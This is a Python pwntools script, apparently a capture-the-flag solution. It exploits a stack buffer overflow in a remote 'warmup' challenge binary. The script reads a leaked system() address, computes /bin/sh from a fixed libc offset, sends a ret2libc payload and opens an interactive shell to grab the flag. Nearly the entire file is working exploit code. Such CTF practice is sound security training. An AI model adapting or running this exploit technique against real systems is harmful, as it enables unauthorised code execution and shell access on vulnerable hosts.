from pwn import *

# Set up pwntools to work with this binary
# elf = context.binary = ELF('warmup')

# Enable verbose logging so we can see exactly what is being sent.
context.log_level = 'debug'

# Figure out how big of an overflow we need by crashing the
pattern ="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC"

# Send the payload to a new copy of the process
# io = process(elf.path)
io = remote('pwnremote.threatsims.com',9000)
#gdb.attach(io, '''
#    set follow-fork-mode child
#    break *vuln+53 
#    continue
#    ''')

io.readline()
system = io.readline()
nothing, system = system.decode().split('@')
print(system)
system = system.rstrip().strip()
bin_sh_address =  int(system,16) + int('0x14CB22',16) # offset for /bin/sh  
system = p32(int(system,16))
# Craft a new payload which puts the "target" address at the correct offset
dummy_ret_address = "FFFF".encode('utf-8')

payload = pattern.encode('utf-8')+system+dummy_ret_address+p32(bin_sh_address) 

io.sendline(payload)
io.interactive()

# Get our flag!
flag = io.recvline()
success(flag)
